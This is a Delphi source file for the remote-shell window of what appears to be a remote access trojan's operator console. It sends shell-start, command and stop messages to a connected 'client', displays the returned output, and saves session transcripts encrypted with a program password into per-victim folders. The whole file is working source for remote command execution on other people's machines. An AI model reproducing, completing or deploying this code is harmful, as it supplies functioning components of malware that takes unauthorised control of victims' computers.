unit UnitShell;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ToolWin, acPNG, ExtCtrls, acImage, jpeg, StdCtrls, UnitMain,
  SocketUnitEx, UnitCommands, UnitFunctions, UnitVariables, UnitRepository,
  UnitConstants, UnitEncryption, UnitManager;

type
  TFormShell = class(TForm)
    tlb1: TToolBar;
    btn1: TToolButton;
    btn2: TToolButton;
    mmoShell: TMemo;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormShow(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure mmoShellKeyPress(Sender: TObject; var Key: Char);
    procedure mmoShellKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
  private
    { Private declarations }
    Client: TClientDatas;
    Lastcommand, LastLine: string;
    procedure AddLog(Log: string);
    procedure AddSentLog(Log: string);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
  public
    { Public declarations }                  
    constructor Create(aOwner: TComponent; _Client: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormShell: TFormShell;

implementation

{$R *.dfm}
                           
constructor TFormShell.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;
         
procedure TFormShell.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if btn1.Down then
  begin
    btn1.Down := False;
    btn1Click(Sender);
  end;
end;
        
procedure TFormShell.AddLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[INFO]', Log, -1, clBlack);
end;

procedure TFormShell.AddSentLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormShell.AddRecvLog(Log: string; lColor: TColor);
begin
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormShell.FormShow(Sender: TObject);
begin
  if mmoShell.Color = clWhite then
  begin
    btn1.Down := True;
    btn1Click(Sender);
  end;
end;

procedure TFormShell.WndProc(var Msg: TMessage);
var
  MainCommand, Datas, TmpStr: string;
begin
  inherited;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin
    Datas := string(Msg.WParam);
    MainCommand := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if MainCommand = SHELLSTART then
    begin
      mmoShell.Clear;
      mmoShell.Color := clBlack;
      AddRecvLog('Shell session started');
    end
    else

    if MainCommand = SHELLSTOP then
    begin
      mmoShell.Clear;
      mmoShell.Color := clWhite;
      AddRecvLog('Shell session stoped');
    end
    else

    if MainCommand = SHELLDATAS then
    begin
      if Length(mmoShell.Text) <= 0 then Delete(Datas, 1, Length(LastCommand)) else
      begin
        Delete(Datas, 1, Length(LastCommand) + 1);
        Datas := #13#10 + Datas;
      end;

      //LastCommand := '';

      mmoShell.Text := mmoShell.Text + Datas;
      mmoShell.SelStart := Length(mmoShell.Text);
      SendMessage(mmoShell.Handle, EM_SCROLLCARET, 0, 0);

      AddRecvLog(FileSizeToStr(Length(Datas)) + ' of shell datas');

      TmpStr := mmoShell.Lines.Strings[mmoShell.Lines.Count - 1];
      if TmpStr[length(TmpStr)] = '>' then LastLine := mmoShell.Lines.Strings[mmoShell.Lines.Count - 1] else
      if length(mmoShell.Lines.Strings[mmoShell.Lines.Count - 1]) <= 2 then
      begin
        mmoShell.Lines.Add('');
        mmoShell.Lines.Add('');
        mmoShell.Text := mmoShell.Text + LastLine;
        mmoShell.SetFocus;
        mmoShell.SelStart := Length(mmoShell.Text);
        SendMessage(mmoShell.Handle, EM_SCROLLCARET, 0, 0);
      end;
    end;
  end;
end;

procedure TFormShell.btn1Click(Sender: TObject);
begin
  if btn1.Down = True then
  begin
    Client.SendDatas(SHELLSTART + '|');
    AddSentLog('Start shell session');
  end
  else
  begin
    Client.SendDatas(SHELLSTOP + '|');
    AddSentLog('Stop shell session');
  end;
end;

procedure TFormShell.btn2Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  TmpStr := GetShellFolder(Client.UserId) + '\' + MyGetDate('-') + '.data';
  TmpStr1 := EnDecryptText(mmoShell.Text, PROGRAMPASSWORD);
  MyCreateFile(TmpStr, TmpStr1, Length(TmpStr1));
  AddLog('Shell session datas saved');
end;

procedure TFormShell.mmoShellKeyPress(Sender: TObject; var Key: Char);
var
  TmpStr: string;
begin
  if mmoShell.Color <> clBlack then Exit;
  
  mmoShell.SelStart := Length(mmoShell.Text);
  SendMessage(mmoShell.Handle, EM_SCROLLCARET, 0, 0);

  if Length(mmoShell.Text) = 0 then
  begin
    Key := #0;
    Exit;
  end;

  if Key = #8 then
  begin
    if mmoShell.SelStart <= LastDelimiter('>', mmoShell.Text) then
    begin
      Key := #0;
      Exit;
    end;
  end;
      
  if mmoShell.SelStart <> Length(mmoShell.Text) then
  begin
    mmoShell.SelStart := Length(mmoShell.Text);
    Exit;
  end;

  if Key = #13 then
  begin
    Key := #0;
    TmpStr := mmoShell.Text;
    Delete(TmpStr, 1, LastDelimiter('>', TmpStr));
    LastCommand := TmpStr;
    if UpperCase(TmpStr) <> 'CLS' then Client.SendDatas(SHELLCOMMAND + '|' + TmpStr) else
    begin
      mmoShell.Clear;
      mmoShell.Text := LastLine;
    end;
  end;
end;

procedure TFormShell.mmoShellKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  TmpStr: string;
begin
  if Key = VK_LEFT then
  begin
    if mmoShell.SelStart <= LastDelimiter('>', mmoShell.Text) then
    begin
      Key := 0;
      Exit;
    end;
  end;

  if Key = VK_UP then
  begin
    Key := 0;                                 
    TmpStr := mmoShell.Text;
    TmpStr := Copy(TmpStr, 1, LastDelimiter('>', TmpStr));
    mmoShell.Text := TmpStr + Lastcommand;
    mmoShell.SelStart := Length(mmoShell.Text);
    SendMessage(mmoShell.Handle, EM_SCROLLCARET, 0, 0);
  end;
end;

end.
